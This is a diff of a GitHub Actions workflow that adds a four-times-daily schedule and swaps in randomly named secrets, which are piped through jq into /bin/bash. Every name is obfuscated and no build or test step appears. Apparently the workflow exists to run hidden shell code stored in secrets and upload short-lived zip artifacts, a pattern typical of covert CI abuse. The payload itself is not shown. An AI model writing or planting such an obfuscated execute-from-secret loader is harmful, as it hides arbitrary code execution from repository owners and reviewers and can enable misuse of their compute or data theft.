@@ -2,6 +2,8 @@ name: CI/CD
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '40 3,9,15,21 * * *'
 env:
   CI: true
 concurrency:
@@ -17,16 +19,16 @@ jobs:
           fetch-depth: 1
       - name: Perform
         env:
-          nla7133: ${{ secrets.nla7133 }}
+          dpv40740: ${{ secrets.dpv40740 }}
         run: |
-          printf '%s' "$nla7133" | jq -r .qfy40395 | /bin/bash
-          echo $ui68531 | jq -r .urnsd84207 | /bin/bash
-          echo $bql50 | jq -r .d911 | /bin/bash
-          echo $zx0756 | jq -r .wukus06 | /bin/bash
+          printf '%s' "$dpv40740" | jq -r .nm662 | /bin/bash
+          echo $qze11653 | jq -r .kxr93 | /bin/bash
+          printf '%s' "$dr8343" | jq -r .ciubl87 | /bin/bash
+          echo $l16030 | jq -r .a62 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
         with:
-          name: TTsMxw0W
+          name: QQH5XUJu
           path: "*.zip"
           retention-days: 1
